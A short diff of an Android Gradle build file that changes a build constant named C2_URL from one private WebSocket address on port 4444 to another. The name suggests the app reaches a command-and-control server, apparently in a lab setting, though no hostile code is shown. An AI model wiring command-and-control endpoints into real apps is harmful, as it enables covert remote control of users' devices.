@@ -12,7 +12,7 @@ android {
         targetSdk = 34
         versionCode = 1
         versionName = "1.0"
-        buildConfigField("String", "C2_URL", "\"ws://192.168.43.1:4444\"")
+        buildConfigField("String", "C2_URL", "\"ws://10.252.196.32:4444\"")
     }
     buildFeatures { buildConfig = true }
     compileOptions {
